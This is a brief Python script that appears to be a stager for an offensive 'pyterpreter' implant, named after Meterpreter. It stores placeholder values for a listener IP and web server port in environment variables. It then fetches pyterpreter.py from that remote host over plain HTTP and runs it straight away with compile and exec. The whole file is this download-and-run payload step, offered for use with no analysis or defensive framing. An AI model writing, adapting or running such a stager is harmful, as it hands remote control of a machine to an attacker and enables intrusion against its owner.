import os
import urllib.request

LOCAL_IP = '<LOCAL_IP>'
WEBSERVER_PORT = '<WEBSERVER_PORT>'

os.environ['PYTERPRETER'] = 'YEET'
os.environ['PYTERPRETER_LOCAL_IP'] = LOCAL_IP
os.environ['PYTERPRETER_WEBSERVER_PORT'] = WEBSERVER_PORT

pyterpreter_code = urllib.request.urlopen(f'http://{LOCAL_IP}:{WEBSERVER_PORT}/resources/pyterpreter.py').read().decode()
pyterpreter_code_compiled = compile(pyterpreter_code, 'pyterpreter_pyckage', 'exec')
exec(pyterpreter_code_compiled, {'__name__': '__main__', '__source__': pyterpreter_code})
